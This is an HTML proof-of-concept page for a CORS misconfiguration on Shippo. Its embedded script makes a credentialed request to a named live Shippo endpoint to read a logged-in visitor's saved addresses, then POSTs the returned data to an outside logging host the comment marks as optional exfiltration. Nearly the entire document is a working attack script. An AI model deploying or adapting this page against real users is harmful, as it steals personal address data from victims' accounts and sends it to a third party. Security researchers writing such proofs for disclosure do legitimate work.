<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Shippo CORS PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>Shippo CORS Misconfiguration PoC</h2>
  <div id="output">Sending request...</div>

  <script>
    // Replace with any vulnerable endpoint you want to test
    const target = "https://service.goshippo.com/ui/user_addresses?results=100";

    fetch(target, {
      method: "GET",
      credentials: "include" 
    })
    .then(res => res.json())
    .then(data => {
      // Display the result
      document.getElementById("output").innerText = JSON.stringify(data, null, 2);

      // Optional: Exfiltrate to your webhook or logging server
      fetch("https://your-logger.daemoon.com/log", {
        method: "POST",
        body: JSON.stringify({
          source: "Shippo CORS PoC",
          data: data
        }),
        headers: {
          "Content-Type": "application/json"
        }
      });
    })
    .catch(err => {
      document.getElementById("output").innerText = "‚ùå Error: " + err;
    });
  </script>
</body>
</html>
